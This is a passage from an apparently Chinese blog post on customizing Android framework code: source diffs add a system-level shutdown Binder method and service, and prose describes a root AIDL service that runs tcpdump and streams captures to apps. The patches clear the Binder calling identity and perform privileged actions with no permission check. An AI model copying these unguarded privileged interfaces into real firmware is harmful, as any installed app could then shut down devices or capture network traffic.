public final class PowerManager &#123;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">+</span><br><span class="line">+    public void myshutdown() &#123;</span><br><span class="line">+        Log.d(&quot;hukaichao PowerManager&quot;, &quot;myshutdown ready&quot;);</span><br><span class="line">+        try &#123;</span><br><span class="line">+            mService.myshutdown();</span><br><span class="line">+        &#125; catch (RemoteException e) &#123;</span><br><span class="line">+            throw e.rethrowFromSystemServer();</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">     /**</span><br><span class="line">      * This function checks if the device has implemented Sustained Performance</span><br><span class="line">      * Mode. This needs to be checked only once and is constant for a particular</span><br><span class="line">diff --git a/core/java/android/os/IPowerManager.aidl b/core/java/android/os/IPowerManager.aidl</span><br><span class="line">index 6cb25cc50c1..92a73055609 100644</span><br><span class="line">--- a/core/java/android/os/IPowerManager.aidl</span><br><span class="line">+++ b/core/java/android/os/IPowerManager.aidl</span><br><span class="line">@@ -52,6 +52,7 @@ interface IPowerManager</span><br><span class="line">     void reboot(boolean confirm, String reason, boolean wait);</span><br><span class="line">     void rebootSafeMode(boolean confirm, boolean wait);</span><br><span class="line">     void shutdown(boolean confirm, String reason, boolean wait);</span><br><span class="line">+    void myshutdown();</span><br><span class="line">     void crash(String message);</span><br><span class="line"></span><br><span class="line">     void setStayOnSetting(int val);</span><br><span class="line">diff --git a/services/core/java/com/android/server/power/PowerManagerService.java b/services/core/java/com/android/server/power/PowerManagerService.java</span><br><span class="line">index d38a9420d96..dfd0f88c6c4 100755</span><br><span class="line">--- a/services/core/java/com/android/server/power/PowerManagerService.java</span><br><span class="line">+++ b/services/core/java/com/android/server/power/PowerManagerService.java</span><br><span class="line">@@ -3730,6 +3730,17 @@ public final class PowerManagerService extends SystemService</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">+        @Override // Binder call</span><br><span class="line">+        public void myshutdown() &#123;</span><br><span class="line">+            </span><br><span class="line">+            final long ident = Binder.clearCallingIdentity();</span><br><span class="line">+            try &#123;</span><br><span class="line">+                shutdownOrRebootInternal(HALT_MODE_SHUTDOWN, false, null, true);</span><br><span class="line">+            &#125; finally &#123;</span><br><span class="line">+                Binder.restoreCallingIdentity(ident);</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+</span><br><span class="line">         /**</span><br><span class="line">          * Crash the runtime (causing a complete restart of the Android framework).</span><br><span class="line">          * Requires REBOOT permission.  Mostly for testing.  Should not return.</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="方法三：采用system-server方法"><a href="#方法三：采用system-server方法" class="headerlink" title="方法三：采用system_server方法"></a>方法三：采用system_server方法</h3><p>思路：自己写一个服务，在SystemService中通过ServiceManager.addService注册，服务是谁注册，就有谁的权限，所以该服务是拥有system权限的，执行的时候相当于system_server进程执行服务，所以是有权限的。</p><p>但是要注意，在调用PowerManager的时候，需要清除Binder的调用标识</p><p>具体补丁如下：</p><p>补丁：<a href="mailto:&#114;&#x6b;&#55;&#x31;&#45;&#x66;&#114;&#x61;&#109;&#101;&#x77;&#x6f;&#114;&#107;&#x73;&#45;&#98;&#x61;&#x73;&#101;&#x40;&#x65;&#x78;&#x65;&#99;&#x75;&#116;&#101;&#x5f;&#x73;&#104;&#117;&#x74;&#100;&#111;&#x77;&#110;&#x5f;&#x74;&#x68;&#x72;&#111;&#x75;&#103;&#104;&#95;&#x61;&#105;&#x64;&#x6c;&#46;&#x70;&#97;&#x74;&#x63;&#104;">&#114;&#x6b;&#55;&#x31;&#45;&#x66;&#114;&#x61;&#109;&#101;&#x77;&#x6f;&#114;&#107;&#x73;&#45;&#98;&#x61;&#x73;&#101;&#x40;&#x65;&#x78;&#x65;&#99;&#x75;&#116;&#101;&#x5f;&#x73;&#104;&#117;&#x74;&#100;&#111;&#x77;&#110;&#x5f;&#x74;&#x68;&#x72;&#111;&#x75;&#103;&#104;&#95;&#x61;&#105;&#x64;&#x6c;&#46;&#x70;&#97;&#x74;&#x63;&#104;</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/core/java/android/content/Context.java b/core/java/android/content/Context.java</span><br><span class="line">index 976f536ceab..131eb6d72fc 100644</span><br><span class="line">--- a/core/java/android/content/Context.java</span><br><span class="line">+++ b/core/java/android/content/Context.java</span><br><span class="line">@@ -2896,6 +2896,12 @@ public abstract class Context &#123;</span><br><span class="line"> </span><br><span class="line">     public static final String INSTALL_SERVICE = &quot;installService&quot;;</span><br><span class="line"> </span><br><span class="line">+</span><br><span class="line">+    public static final String SYSTEM_SERVICE = &quot;system_service&quot;;</span><br><span class="line">+</span><br><span class="line">     /**</span><br><span class="line">      * Use with &#123;@link #getSystemService&#125; to retrieve a</span><br><span class="line">      * &#123;@link android.os.PowerManager&#125; for controlling power management,</span><br><span class="line">diff --git a/Android.mk b/Android.mk</span><br><span class="line">index fc6bdf9ade5..8df666c76ea 100755</span><br><span class="line">--- a/Android.mk</span><br><span class="line">+++ b/Android.mk</span><br><span class="line">@@ -96,6 +96,7 @@ LOCAL_SRC_FILES += \</span><br><span class="line"> core/java/android/app/IWallpaperManagerCallback.aidl \</span><br><span class="line"> core/java/android/app/ITechvisionService.aidl \</span><br><span class="line"> core/java/android/app/ITechvisionCallback.aidl \</span><br><span class="line">+core/java/android/app/customapi/system/ISystemApiService.aidl \</span><br><span class="line"> core/java/android/app/admin/IDevicePolicyManager.aidl \</span><br><span class="line"> core/java/android/app/trust/IStrongAuthTracker.aidl \</span><br><span class="line"> core/java/android/app/trust/ITrustManager.aidl \</span><br><span class="line">diff --git a/core/java/android/app/customapi/system/Android.mk b/core/java/android/app/customapi/system/Android.mk</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..3646f7965eb</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/system/Android.mk</span><br><span class="line">@@ -0,0 +1,16 @@</span><br><span class="line">+LOCAL_PATH := $(call my-dir)</span><br><span class="line">+include $(CLEAR_VARS)</span><br><span class="line">+</span><br><span class="line">+LOCAL_MODULE := SystemApiService</span><br><span class="line">+</span><br><span class="line">+LOCAL_AIDL_INCLUDES := \</span><br><span class="line">+    $(LOCAL_PATH) \</span><br><span class="line">+    </span><br><span class="line">+LOCAL_SRC_FILES := \</span><br><span class="line">+ISystemApiService.aidl \</span><br><span class="line">+   SystemApiService.java \</span><br><span class="line">+   SystemServiceManager.java \</span><br><span class="line">+</span><br><span class="line">+LOCAL_DEX_PREOPT := false</span><br><span class="line">+LOCAL_JACK_ENABLED := disabled</span><br><span class="line">+include $(BUILD_STATIC_JAVA_LIBRARY)</span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/core/java/android/app/customapi/system/ISystemApiService.aidl b/core/java/android/app/customapi/system/ISystemApiService.aidl</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..7e9be829274</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/system/ISystemApiService.aidl</span><br><span class="line">@@ -0,0 +1,5 @@</span><br><span class="line">+package android.app.customapi.system;</span><br><span class="line">+ </span><br><span class="line">+interface ISystemApiService&#123;</span><br><span class="line">+   void reboot();</span><br><span class="line">+&#125;</span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/core/java/android/app/customapi/system/SystemApiService.java b/core/java/android/app/customapi/system/SystemApiService.java</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..aca22d07513</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/system/SystemApiService.java</span><br><span class="line">@@ -0,0 +1,32 @@</span><br><span class="line">+package android.app.customapi.system;</span><br><span class="line">+</span><br><span class="line">+import android.content.Context;</span><br><span class="line">+import android.os.PowerManager;</span><br><span class="line">+</span><br><span class="line">+public class SystemApiService extends ISystemApiService.Stub &#123;</span><br><span class="line">+</span><br><span class="line">+    private Context mcontext;</span><br><span class="line">+</span><br><span class="line">+    private IPowerManager mPowerManager;</span><br><span class="line">+</span><br><span class="line">+    private Handler mHandler;</span><br><span class="line">+</span><br><span class="line">+    public SystemApiService(Context context)&#123;</span><br><span class="line">+        mcontext = context;</span><br><span class="line">+        mPowerManager = getPowerManager();</span><br><span class="line">+        mHandler = new Handler(mcontext.getMainLooper());</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    private IPowerManager getPowerManager() &#123;</span><br><span class="line">+        IBinder powerManagerBinder = ServiceManager.getService(Context.POWER_SERVICE);</span><br><span class="line">+        if (powerManagerBinder != null) &#123;</span><br><span class="line">+            Log.d(TAG, &quot;getPowerManager&quot;);</span><br><span class="line">+            return IPowerManager.Stub.asInterface(powerManagerBinder);</span><br><span class="line">+        &#125;</span><br><span class="line">+        return null;</span><br><span class="line">+     &#125;</span><br><span class="line">+</span><br><span class="line">+    @Override</span><br><span class="line">+    public void reboot() &#123;</span><br><span class="line">+       try &#123;</span><br><span class="line">+            final long origId = Binder.clearCallingIdentity();</span><br><span class="line">+            if (mPowerManager != null) &#123;</span><br><span class="line">+                PowerManager powerManager = new PowerManager(mcontext, mPowerManager, mHandler);</span><br><span class="line">+                powerManager.shutdown(false, null, true);</span><br><span class="line">+            &#125;</span><br><span class="line">+            Binder.restoreCallingIdentity(origId);</span><br><span class="line">+        &#125; catch (Exception e) &#123;</span><br><span class="line">+            e.printStackTrace();</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line">diff --git a/services/java/com/android/server/SystemServer.java b/services/java/com/android/server/SystemServer.java</span><br><span class="line">index f74b69b612f..aba6d2b659d 100644</span><br><span class="line">--- a/services/java/com/android/server/SystemServer.java</span><br><span class="line">+++ b/services/java/com/android/server/SystemServer.java</span><br><span class="line">@@ -20,6 +20,7 @@ import android.app.InstallService;</span><br><span class="line"> import android.app.ActivityThread;</span><br><span class="line"> import android.app.INotificationManager;</span><br><span class="line"> import android.app.usage.UsageStatsManagerInternal;</span><br><span class="line">+import android.app.customapi.system.SystemApiService;</span><br><span class="line"> import android.content.ComponentName;</span><br><span class="line"> import android.content.ContentResolver;</span><br><span class="line"> import android.content.Context;</span><br><span class="line">@@ -596,6 +597,9 @@ public final class SystemServer &#123;</span><br><span class="line">             ServiceManager.addService(Context.INSTALL_SERVICE, new InstallService());</span><br><span class="line">             Trace.traceEnd(Trace.TRACE_TAG_SYSTEM_SERVER);</span><br><span class="line">             </span><br><span class="line">+            traceBeginAndSlog(&quot;StartSystemApiService&quot;);</span><br><span class="line">+            ServiceManager.addService(Context.SYSTEM_SERVICE, new SystemApiService(context));</span><br><span class="line">+            Trace.traceEnd(Trace.TRACE_TAG_SYSTEM_SERVER);</span><br><span class="line"> </span><br><span class="line">             mSystemServiceManager.startService(TelecomLoaderService.class);</span><br><span class="line">diff --git a/core/java/android/app/customapi/system/SystemServiceManager.java b/core/java/android/app/customapi/system/SystemServiceManager.java</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..e26a376a13d</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/system/SystemServiceManager.java</span><br><span class="line">@@ -0,0 +1,24 @@</span><br><span class="line">+package android.app.customapi.system;</span><br><span class="line">+</span><br><span class="line">+import android.util.Log;</span><br><span class="line">+import android.app.customapi.system.ISystemApiService;</span><br><span class="line">+import android.content.Context;</span><br><span class="line">+</span><br><span class="line">+public class SystemServiceManager &#123;</span><br><span class="line">+</span><br><span class="line">+    private static final String TAG = &quot;System Service Manager&quot;;</span><br><span class="line">+    private ISystemApiService systemApiService;</span><br><span class="line">+</span><br><span class="line">+    public SystemServiceManager(Context context, ISystemApiService systemService)&#123;</span><br><span class="line">+        systemApiService = systemService;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    public void execute()&#123;</span><br><span class="line">+        Log.d(TAG, &quot;manager start&quot;);</span><br><span class="line">+        try &#123;</span><br><span class="line">+            systemApiService.reboot();</span><br><span class="line">+        &#125; catch (Exception e) &#123;</span><br><span class="line">+            e.printStackTrace();</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/core/java/android/app/SystemServiceRegistry.java b/core/java/android/app/SystemServiceRegistry.java</span><br><span class="line">index 80fd5b327f6..23d6e0f7c62 100644</span><br><span class="line">--- a/core/java/android/app/SystemServiceRegistry.java</span><br><span class="line">+++ b/core/java/android/app/SystemServiceRegistry.java</span><br><span class="line">@@ -23,6 +23,8 @@ import com.android.internal.os.IDropBoxManagerService;</span><br><span class="line"> </span><br><span class="line"> import android.accounts.AccountManager;</span><br><span class="line"> import android.accounts.IAccountManager;</span><br><span class="line">+import android.app.customapi.system.SystemServiceManager;</span><br><span class="line">+import android.app.customapi.system.ISystemApiService;</span><br><span class="line"> import android.app.admin.DevicePolicyManager;</span><br><span class="line"> import android.app.job.IJobScheduler;</span><br><span class="line"> import android.app.job.JobScheduler;</span><br><span class="line">@@ -786,6 +788,14 @@ final class SystemServiceRegistry &#123;</span><br><span class="line">                 return new ContextHubManager(ctx.getOuterContext(),</span><br><span class="line">                   ctx.mMainThread.getHandler().getLooper());</span><br><span class="line">             &#125;&#125;);</span><br><span class="line">+</span><br><span class="line">+        registerService(Context.SYSTEM_SERVICE, SystemServiceManager.class,</span><br><span class="line">+                new CachedServiceFetcher&lt;SystemServiceManager&gt;() &#123;</span><br><span class="line">+            @Override</span><br><span class="line">+            public SystemServiceManager createService(ContextImpl ctx) &#123;</span><br><span class="line">+                IBinder b = ServiceManager.getService(Context.SYSTEM_SERVICE);</span><br><span class="line">+                return new SystemServiceManager(ctx.getOuterContext(),ISystemApiService.Stub.asInterface(b));</span><br><span class="line">+            &#125;&#125;);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     /**</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2、root权限的api（aidl）"><a href="#2、root权限的api（aidl）" class="headerlink" title="2、root权限的api（aidl）"></a>2、root权限的api（aidl）</h2><p>内容其实和之前的文章《AIDL通信学习》中的跨语言的aidl类似，补充两个知识点吧</p><p>通过编译指定的模块后会生成二进制文件，而要想让服务以root权限自启动，需要在整编时将模块也进行编译，这里一般的方法是将模块添加到 device.mk中，类似于下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/device.mk b/device.mk</span><br><span class="line">index db90248..1af02d2 100755</span><br><span class="line">--- a/device.mk</span><br><span class="line">+++ b/device.mk</span><br><span class="line">@@ -19,7 +19,8 @@ PRODUCT_PACKAGES += \</span><br><span class="line">     WallpaperPicker \</span><br><span class="line">     Launcher3 \</span><br><span class="line">     Lightning \</span><br><span class="line">-    SoundRecorder</span><br><span class="line">+    SoundRecorder \</span><br><span class="line">+RootApiService</span><br><span class="line"> </span><br><span class="line"> #$_rbox_$_modify_$_zhengyang: add displayd</span><br><span class="line"> PRODUCT_PACKAGES += \</span><br></pre></td></tr></table></figure><p>然后需要一个rc文件来给权限，rc文件在补丁最后有给出。</p><p>另外一个知识点是关于C++的，在需求中，要求服务端执行tcpdump指令抓包，将抓包结果实时返回给客户端。如果直接执行tcpdump指令，方法会阻塞，并在指令结束后一次性将所有信息返回，这是不理想的。</p><p>处理方法是开启一个子线程执行tcpdump，将标准输出重定向到管道中，在父进程中从循环从管道读取数据，返回给客户端。详细的处理代码在补丁中也有，一开始对C++不熟悉真不好做这个。</p><p>当子进程中操作结束，父进程将管道内数据读完，这个时候父进程不会被关闭，管道为空了也会一直等待数据写入。所以在子进程指令执行结束后需要关闭管道的写端，这个时候父进程会读0个字节，然后跳出循环。</p><p>补丁： <a href="mailto:&#x72;&#107;&#55;&#49;&#45;&#102;&#x72;&#x61;&#109;&#101;&#x77;&#111;&#114;&#x6b;&#x73;&#x2d;&#98;&#97;&#115;&#x65;&#45;&#64;&#101;&#120;&#x65;&#x63;&#x75;&#116;&#101;&#x5f;&#x74;&#x63;&#112;&#100;&#x75;&#109;&#112;&#95;&#x77;&#x69;&#116;&#x68;&#95;&#114;&#111;&#111;&#116;&#95;&#x70;&#101;&#114;&#x6d;&#x69;&#115;&#x73;&#x69;&#x6f;&#x6e;&#46;&#x70;&#x61;&#116;&#99;&#x68;">&#x72;&#107;&#55;&#49;&#45;&#102;&#x72;&#x61;&#109;&#101;&#x77;&#111;&#114;&#x6b;&#x73;&#x2d;&#98;&#97;&#115;&#x65;&#45;&#64;&#101;&#120;&#x65;&#x63;&#x75;&#116;&#101;&#x5f;&#x74;&#x63;&#112;&#100;&#x75;&#109;&#112;&#95;&#x77;&#x69;&#116;&#x68;&#95;&#114;&#111;&#111;&#116;&#95;&#x70;&#101;&#114;&#x6d;&#x69;&#115;&#x73;&#x69;&#x6f;&#x6e;&#46;&#x70;&#x61;&#116;&#99;&#x68;</a></p><p>现象：AS导入jar包后，可使用 RootServiceManager 类，该类提供了注册回调、执行指令、删除回调三个方法供客户端调用<br>RootServiceManager.getInstance().registerCallback(rootApiServiceCallback) 注册回调，须在客户端注册 IRootApiServiceCallback 并重写 onCommandCompleted 回调方法<br>RootServiceManager.getInstance().executeCommand(10) 执行tcpdump指令，该方法需要传入一个整形参数，用于指定执行时间，传入10则抓包10秒后自动终止 抓包结果会通过回调返回<br>RootServiceManager.getInstance().unregisterCallback(rootApiServiceCallback) 用于释放回调</p><p>解决方案：采用C++实现 aidl 提供的四个接口，分别为注册回调、释放回调、执行指令、调用回调。其中最核心的接口为执行指令。<br>为了能在指定时间结束抓包，指令采用 timeout %d tcpdump ，在指定时间后中断指令<br>为了能实时返回抓包信息，将执行tcpdump指令放在一个子进程中执行，执行结果重定向到管道。父进程循环从管道中读取输出并通过回调传递给客户端<br>在子进程结束抓包后，关闭管道写端，同时父进程也会跳出循环。<br>最后写了一个 RootServiceManager 类用来打包为 jar 包 并方便客户端调用相关接口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span 